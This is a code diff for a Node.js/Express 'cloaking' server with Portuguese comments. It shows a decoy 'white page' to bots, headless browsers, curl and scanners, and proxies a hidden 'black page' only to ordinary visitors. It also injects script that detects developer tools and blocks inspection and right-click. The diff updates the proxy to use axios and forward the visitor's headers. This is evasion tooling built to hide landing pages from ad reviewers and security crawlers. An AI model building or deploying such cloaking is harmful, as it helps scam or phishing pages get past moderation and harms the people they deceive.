@@ -4,8 +4,7 @@ const mongoose = require("mongoose");
 const cors = require("cors");
 const helmet = require("helmet");
 const redis = require("redis");
-const fetch = require("node-fetch");
-
+const axios = require("axios"); // ✅ substituindo fetch
 const { isBot } = require("./utils/botDetection");
 const { mutateHTMLSafe } = require("./utils/mutator");
 const Domain = require("./models/Domain");
@@ -31,10 +30,9 @@ app.use("/api/domain", domainRoutes);
 app.use("/cloak/script", scriptRoutes);
 app.use("/api/payload", payloadRoutes);
 
-// 🧠 Redis
+// 🧠 Redis (opcional)
 if (process.env.REDIS_URL) {
   const redisClient = redis.createClient({ url: process.env.REDIS_URL });
-
   redisClient.on("error", (err) => console.error("❌ Redis error:", err.message));
   redisClient.connect()
     .then(() => console.log("🔥 Redis conectado"))
@@ -57,34 +55,38 @@ if (process.env.REDIS_URL) {
 // ⚔️ Middleware Reverse Proxy Blindado
 app.use(async (req, res, next) => {
   try {
-    const host = req.hostname; // domínio acessado
+    const host = req.hostname;
     const ua = req.headers["user-agent"] || "";
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-    // 🔥 Busca config do domínio pelo officialUrl
     const domain = await Domain.findOne({ officialUrl: `https://${host}` });
     if (!domain) return res.redirect("https://google.com");
 
-    // 1. Anti-bot
+    // Anti-bot primitivo
     if (isBot(ua, ip)) {
-      return res.redirect(domain.baseUrl);
+      return res.redirect(domain.baseUrl); // white page
     }
 
-    // 2. Auditor/Headless/DevTools
+    // Headless & Devtools
     if (
       ua.length < 20 ||
       /Headless|Puppeteer|Scrapy|curl|python-requests|Go-http/i.test(ua)
     ) {
-      return res.redirect(domain.fallbackUrl);
+      return res.redirect(domain.fallbackUrl); // fallback tipo Google
     }
 
-    // 3. Buscar site real (landing escondida)
-    const targetUrl = domain.realUrl + req.originalUrl;
-    const axios = require('axios');
-    const response = await axios.get(url, { headers });
+    // Conteúdo real da página preta
+    const proxyUrl = domain.realUrl + req.originalUrl;
+    const headers = {
+      "User-Agent": ua,
+      "X-Forwarded-For": ip,
+      Referer: req.get("referer") || '',
+    };
+
+    const response = await axios.get(proxyUrl, { headers });
     const html = response.data;
 
-    // 🔥 Script client-side anti-devtools
+    // Script Anti-Clonagem e DevTools
     const antiDevToolsScript = `
       <script>
         function devtoolsDetector(){
@@ -92,7 +94,6 @@ app.use(async (req, res, next) => {
           if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
         }
         setInterval(devtoolsDetector, 1000);
-
         document.addEventListener('keydown', function(e){
           if(
             e.key==='F12' ||
@@ -102,14 +103,12 @@ app.use(async (req, res, next) => {
             e.preventDefault(); window.location.href='${domain.fallbackUrl}';
           }
         });
-
         document.addEventListener('contextmenu', e=>{
           e.preventDefault(); alert('🚫 Proibido clonar!');
         });
       </script>
     `;
 
-    // Mutar HTML e injetar anti-devtools
     let mutated = mutateHTMLSafe(html);
     mutated = mutated.replace("</body>", `${antiDevToolsScript}</body>`);
 
